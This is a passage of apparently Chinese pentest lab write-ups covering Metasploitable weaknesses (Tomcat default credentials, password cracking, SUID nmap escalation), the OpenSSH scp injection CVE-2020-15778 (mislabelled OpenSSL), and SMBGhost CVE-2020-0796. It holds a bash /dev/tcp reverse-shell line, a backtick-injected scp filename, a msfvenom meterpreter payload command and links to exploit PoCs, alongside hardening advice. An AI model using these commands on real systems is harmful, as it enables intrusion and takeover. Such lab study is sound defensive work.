<h4 id="验证漏洞-13"><a href="#验证漏洞-13" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124160745954.png" alt="image-20210124160745954"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124160755640.png" alt="image-20210124160755640"></p>
<h4 id="安全加固-12"><a href="#安全加固-12" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>升级服务版本</p>
</blockquote>
<h2 id="Tomcat管理台默认口令漏洞-8180"><a href="#Tomcat管理台默认口令漏洞-8180" class="headerlink" title="Tomcat管理台默认口令漏洞(8180)"></a>Tomcat管理台默认口令漏洞(8180)</h2><h4 id="发现漏洞-14"><a href="#发现漏洞-14" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124151747555.png" alt="image-20210124151747555"></p>
<h4 id="验证漏洞-14"><a href="#验证漏洞-14" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><blockquote>
<p>通过<code>tomcat_mgr_login</code>爆出管理台默认</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124152816602.png" alt="image-20210124152816602"></p>
<blockquote>
<p>通过<code>tomcat_mgr_deploy</code>模块得到shell</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124153338675.png" alt="image-20210124153338675"></p>
<p><strong>tomcat默认端口8080</strong></p>
<h4 id="安全加固-13"><a href="#安全加固-13" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>修改默认管理用户密码</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124153554917.png" alt="image-20210124153554917"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124153619919.png" alt="image-20210124153619919"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124153642301.png" alt="image-20210124153642301"></p>
<blockquote>
<p>再次爆破管理台密码,失败</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124153828832.png" alt="image-20210124153828832"></p>
<h2 id="登入提示漏洞"><a href="#登入提示漏洞" class="headerlink" title="登入提示漏洞"></a>登入提示漏洞</h2><h4 id="发现漏洞-15"><a href="#发现漏洞-15" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120200456749.png" alt="image-20210120200456749"></p>
<h4 id="验证漏洞-15"><a href="#验证漏洞-15" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p>使用账号<strong>msfadmin</strong>；密码<strong>msfadmin</strong>登入系统</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120200520233.png" alt="image-20210120200520233"></p>
<h4 id="安全加固-14"><a href="#安全加固-14" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>删除页面提示（<code>vim /etc/issue</code>)</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120200720088.png" alt="image-20210120200720088"></p>
<h2 id="危险系统用户"><a href="#危险系统用户" class="headerlink" title="危险系统用户"></a>危险系统用户</h2><h4 id="发现漏洞-16"><a href="#发现漏洞-16" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124103029133.png" alt="image-20210124103029133"></p>
<h4 id="验证漏洞-16"><a href="#验证漏洞-16" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><blockquote>
<p>发现有许多可登入系统的弱密码用户</p>
<p>将可登入系统的用户的shadow文件保存到pass</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124103420305.png" alt="image-20210124103420305"></p>
<blockquote>
<p>使用john工具破解密码</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124104347493.png" alt="image-20210124104347493"></p>
<blockquote>
<p>使用用户密码登入系统</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124103601179.png" alt="image-20210124103601179"></p>
<h4 id="安全加固-15"><a href="#安全加固-15" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>加强密码强度</p>
</blockquote>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><h4 id="发现漏洞-17"><a href="#发现漏洞-17" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><blockquote>
<p>查看系统上运行的所有SUID可执行文件。</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210223163700097.png" alt="image-20210223163700097"></p>
<blockquote>
<p>以上所有二进制文件都将以root用户权限执行，因为它们的权限中包含”s”，并且对应的是root权限。</p>
</blockquote>
<h4 id="验证漏洞-17"><a href="#验证漏洞-17" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><blockquote>
<p>利用nmap进行提权</p>
<p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210223163752835.png" alt="image-20210223163752835"></p>
<blockquote>
<p>交互模式可以通过执行Nmap参数<code>interactive</code></p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210223163853172.png" alt="image-20210223163853172"></p>
<h4 id="安全加固-16"><a href="#安全加固-16" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>将nmap版本升级到5.21以上</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-15778 OpenSSL漏洞复现</title>
    <url>/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p>
<blockquote>
<p>OpenSSH &lt;= 8.3p1 </p>
</blockquote>
<p><strong>漏洞介绍</strong></p>
<blockquote>
<p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p>
</blockquote>
<p><strong>局限性</strong></p>
<blockquote>
<p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p>
</blockquote>
<ol>
<li><strong>关闭自带防火墙(firewalld)</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">停止firewalld服务 
$ systemctl stop firewalld
</code></pre>
<ol start="2">
<li><strong>设置iptables策略</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">service iptables start
iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP
service iptables save
iptables -L -n --line-number 
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p>
<p><strong>验证</strong></p>
<blockquote>
<p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p>
<pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p>
<p><strong>kali监听6666端口</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p>
<p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p>
<p><strong>命令执行，运行1.sh</strong></p>
<pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
<p>scp命令源码</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;
    xasprintf(&bp, "%s -t %s%s", cmd,
        *targ == '-' ? "-- " : "", targ);
    if (do_cmd(thost, tuser, tport, bp, &remin,
        &remout) < 0)
        exit(1);
    if (response() < 0)
        exit(1);
    free(bp);
&#125;
</code></pre>
<p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
<p>SMB远程代码执行漏洞</p>
<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
</blockquote>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows Server, Version 1903 (Server Core installation)
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server, Version 1909 (Server Core installation)
</code></pre>
<p><strong>漏洞复现工具下载</strong></p>
<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
</code></pre>
<ol>
<li><strong>将目标机的防火墙关闭</strong></li>
<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
<ol start="3">
<li><strong>利用下载的poc脚本发起攻击</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
</code></pre>
<ol>
<li><strong>生成一个反弹木马</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python

   说明: 
   #-p payload
   #-e 编码方式
   #-i 编码次数
   #-b 过滤坏字符
   #LHOST,LPORT 监听上线的主机IP和端口
   #-f python 生成python格式
   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
<ol start="2">
<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
<ol start="3">
<li><strong>开启msf监听模块</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
<ol start="4">
<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
<blockquote>
<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
</blockquote>
]]></content>
  </entry>
</search>
